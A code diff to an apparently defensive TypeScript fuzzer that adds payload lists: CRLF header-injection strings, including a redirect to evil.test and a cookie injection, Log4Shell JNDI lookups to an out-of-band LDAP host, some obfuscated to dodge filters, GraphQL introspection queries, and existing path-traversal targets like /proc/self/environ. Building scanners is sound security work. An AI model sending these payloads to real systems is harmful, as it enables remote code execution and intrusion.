@@ -89,7 +89,23 @@ const FUZZ_GRAMMARS: Record<string, string[]> = {
     "/proc/self/environ",
     "C:\\windows\\win.ini",
   ],
+  header_injection: [
+    "test\r\nX-Injected: 1",
+    "test%0d%0aX-Injected:%201",
+    "test\nLocation: https://evil.test",
+    "test%0aSet-Cookie:%20pwn=1",
+  ],
+  log4shell: [
+    "${jndi:ldap://oob.cyberscope.test/x}",
+    "${${lower:j}ndi:${lower:l}dap://oob.cyberscope.test/x}",
+    "${${::-j}${::-n}${::-d}${::-i}:ldap://oob.cyberscope.test/x}",
+  ],
+  graphql_introspection: [
+    "{__schema{types{name,fields{name}}}}",
+    "query{__type(name:\"User\"){fields{name,type{name}}}}",
+  ],
 };
+
 
 // Genetic mutation operators
 function mutate(seed: string): string[] {
